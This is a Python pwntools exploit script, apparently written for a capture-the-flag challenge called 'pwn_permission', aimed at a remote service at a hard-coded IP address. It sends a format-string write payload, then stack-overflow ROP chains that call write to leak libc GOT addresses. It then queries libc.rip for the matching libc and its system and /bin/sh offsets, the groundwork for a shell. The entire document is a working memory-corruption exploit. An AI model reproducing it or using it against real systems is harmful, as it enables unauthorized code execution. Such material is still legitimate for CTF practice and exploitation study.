
from pwn import *
import time

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)

target_val_addr = 0x804c030
fmt_payload = b'%5c%6$na' + p32(target_val_addr)
conn.send(fmt_payload)
time.sleep(2)

response = conn.recv(timeout=5)
if b'Input:' not in response:
    log.error("没触发vuln！")
    conn.close()
    exit(1)

log.success("vuln已触发！")

functions_to_leak = ['puts', 'printf', 'write', 'read', '__libc_start_main', 'setvbuf', 'memset']

write_plt = elf.plt['write']
vuln_addr = elf.symbols['vuln']

leaked = {}

for func_name in functions_to_leak:
    if func_name not in elf.got:
        log.warning(f"{func_name} not in GOT, skip")
        continue
    
    got_addr = elf.got[func_name]
    
    payload = b'A' * 148
    payload += p32(write_plt)
    payload += p32(vuln_addr)
    payload += p32(1)
    payload += p32(got_addr)
    payload += p32(4)
    
    conn.send(payload)
    time.sleep(1)
    
    try:
        response = conn.recv(timeout=3)
        if len(response) >= 4:
            func_addr = u32(response[:4])
            leaked[func_name] = func_addr
            last_12_bits = func_addr & 0xfff
            log.info(f"{func_name}: 0x{func_addr:x} (last 3 nibbles: {last_12_bits:03x})")
        else:
            log.warning(f"{func_name}: not enough data")
    except Exception as e:
        log.error(f"{func_name}: leak failed - {e}")
        break

conn.close()

print("\n" + "=" * 60)
print("Leaked libc function addresses:")
print("=" * 60)
for func_name, addr in leaked.items():
    last_12_bits = addr & 0xfff
    print(f"  {func_name:25s} = 0x{addr:08x}  (low12: 0x{last_12_bits:03x})")

if 'puts' in leaked and '__libc_start_main' in leaked:
    offset_diff = leaked['puts'] - leaked['__libc_start_main']
    print(f"\nputs - __libc_start_main = 0x{offset_diff:x}")

if 'puts' in leaked and 'printf' in leaked:
    offset_diff = leaked['printf'] - leaked['puts']
    print(f"printf - puts = 0x{offset_diff:x}")

if 'puts' in leaked and 'write' in leaked:
    offset_diff = leaked['write'] - leaked['puts']
    print(f"write - puts = 0x{offset_diff:x}")

if 'puts' in leaked and 'read' in leaked:
    offset_diff = leaked['read'] - leaked['puts']
    print(f"read - puts = 0x{offset_diff:x}")

print("\n" + "=" * 60)
print("Querying libc.rip...")
print("=" * 60)

try:
    import requests
    import json
    
    symbols_dict = {}
    for func_name, addr in leaked.items():
        symbols_dict[func_name] = hex(addr & 0xfff)
    
    print(f"Query: {json.dumps({'symbols': symbols_dict})}")
    
    resp = requests.post("https://libc.rip/api/find", json={"symbols": symbols_dict}, timeout=15)
    
    if resp.status_code == 200:
        results = resp.json()
        if results:
            print(f"\nFound {len(results)} matching libc(s):\n")
            for i, result in enumerate(results):
                print(f"--- Match #{i+1} ---")
                print(f"  ID: {result.get('id', 'N/A')}")
                print(f"  Build ID: {result.get('buildid', 'N/A')}")
                print(f"  URL: {result.get('url', 'N/A')}")
                
                symbols = result.get('symbols', {})
                for sym_name in ['system', 'str_bin_sh', 'execve', '__libc_start_main', 'puts']:
                    if sym_name in symbols:
                        print(f"  {sym_name}: {symbols[sym_name]}")
                print()
        else:
            print("No matching libc found!")
    else:
        print(f"Query failed, status: {resp.status_code}")
        print(f"Response: {resp.text}")
        
except ImportError:
    print("requests not installed, query manually at https://libc.rip")
except Exception as e:
    print(f"Query error: {e}")
    print("Query manually at https://libc.rip")
